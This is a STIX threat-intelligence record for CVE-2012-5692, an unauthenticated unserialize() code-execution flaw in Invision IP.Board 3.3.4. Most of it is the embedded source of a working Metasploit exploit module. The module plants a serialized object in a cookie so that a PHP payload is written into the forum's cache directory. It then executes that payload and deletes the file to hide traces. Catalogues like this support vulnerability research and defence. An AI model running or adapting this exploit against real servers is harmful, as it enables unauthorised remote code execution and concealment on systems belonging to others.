{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca8e3405-0e40-462d-bc66-38eef0e97557",
    "created": "2024-08-14T17:13:44.298043Z",
    "modified": "2024-08-14T17:13:44.298047Z",
    "name": "Invision IP.Board unserialize() PHP Code Execution",
    "description": " This module exploits a php unserialize() vulnerability in Invision IP.Board <= 3.3.4 which could be abused to allow unauthenticated users to execute arbitrary code under the context of the webserver user.  The dangerous unserialize() exists in the '/admin/sources/base/core.php' script which is called with user controlled data from the cookie. The exploit abuses the __destruct() method from the dbMain class to write arbitrary PHP code to a file on the Invision IP.Board web directory.  The exploit has been tested successfully on Invision IP.Board 3.3.4. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/invision_pboard_unserialize_exec.rb",
            "external_id": "invision_pboard_unserialize_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5692"
        },
        {
            "source_name": "reference",
            "url": "http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-critical-security-update/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Invision IP.Board unserialize() PHP Code Execution',\n        'Description' => %q{\n          This module exploits a php unserialize() vulnerability in Invision IP.Board\n          <= 3.3.4 which could be abused to allow unauthenticated users to execute arbitrary\n          code under the context of the webserver user.\n\n          The dangerous unserialize() exists in the '/admin/sources/base/core.php' script,\n          which is called with user controlled data from the cookie. The exploit abuses the\n          __destruct() method from the dbMain class to write arbitrary PHP code to a file on\n          the Invision IP.Board web directory.\n\n          The exploit has been tested successfully on Invision IP.Board 3.3.4.\n        },\n        'Author' => [\n          'EgiX', # Vulnerability discovery, PoC, work on check() and cookie_prefix() methods\n          'juan vazquez', # Metasploit module\n          'sinn3r'        # PhpEXE tekniq & check() method\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2012-5692' ],\n          [ 'OSVDB', '86702' ],\n          [ 'BID', '56288' ],\n          [ 'EDB', '22398' ],\n          [ 'URL', 'http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-critical-security-update/' ]\n        ],\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Payload' => {\n          'Space' => 8000, # Apache's limit for GET\n          'DisableNops' => true\n        },\n        'Targets' => [ ['Invision IP.Board 3.3.4', {}] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-10-25',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/forums/\"])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def base\n    base = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n    return base\n  end\n\n  def cookie_prefix\n    print_status(\"Checking for cookie prefix\")\n    cookie_prefix = \"\"\n    res = send_request_cgi(\n      {\n        'uri' => \"#{base}index.php\",\n        'method' => 'GET'\n      }\n    )\n\n    if res and res.code == 200 and res.get_cookies =~ /(.+)session/\n      print_status(\"Cookie prefix #{$1} found\")\n      cookie_prefix = $1\n    end\n    return cookie_prefix\n  end\n\n  def check\n    check_str = Rex::Text.uri_encode('a:1:{i:0;O:1:\"x\":0:{}}')\n    res = send_request_cgi(\n      {\n        'uri' => \"#{base}index.php\",\n        'method' => 'GET',\n        'cookie' => \"#{cookie_prefix}session_id=#{check_str}\"\n      }\n    )\n\n    if res and res.code == 500 or res.body =~ /PHP_Incomplete_Class/\n      return Exploit::CheckCode::Vulnerable\n    elsif res and res.code == 200\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      begin\n        print_warning(\"Deleting #{@upload_php}\")\n        client.fs.file.rm(@upload_php)\n        print_good(\"#{@upload_php} removed to stay ninja\")\n      rescue\n        print_error(\"Unable to remove #{f}\")\n      end\n    end\n  end\n\n  def exploit\n    @upload_php = rand_text_alpha(rand(4) + 4) + \".php\"\n\n    # get_write_exec_payload uses a function, which limits our ability to support\n    # Linux payloads, because that requires a space:\n    #   function my_cmd\n    # becomes:\n    #   functionmy_cmd #Causes parsing error\n    # We'll have to address that in the mixin, and then come back to this module\n    # again later.\n    php_payload = get_write_exec_payload(:unlink_self => true)\n    php_payload = php_payload.gsub(/^\\<\\?php/, '<?')\n    php_payload = php_payload.gsub(/ /, '')\n\n    db_driver_mysql = \"a:1:{i:0;O:15:\\\"db_driver_mysql\\\":1:{s:3:\\\"obj\\\";a:2:{s:13:\\\"use_debug_log\\\";i:1;s:9:\\\"debug_log\\\";s:#{\"cache/#{@upload_php}\".length}:\\\"cache/#{@upload_php}\\\";}}}\"\n\n    print_status(\"Exploiting the unserialize() to upload PHP code\")\n\n    res = send_request_cgi(\n      {\n        'uri' => \"#{base}index.php?#{php_payload}\",\n        'method' => 'GET',\n        'cookie' => \"#{cookie_prefix}member_id=#{Rex::Text.uri_encode(db_driver_mysql)}\"\n      }\n    )\n\n    if not res or res.code != 200\n      print_error(\"Exploit failed: #{res.code}\")\n      return\n    end\n\n    print_status(\"Executing the payload #{@upload_php}\")\n\n    res = send_request_raw({ 'uri' => \"#{base}cache/#{@upload_php}\" })\n\n    if res\n      print_error(\"Payload execution failed: #{res.code}\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-25",
    "x_mitre_platforms": [
        "['php']"
    ]
}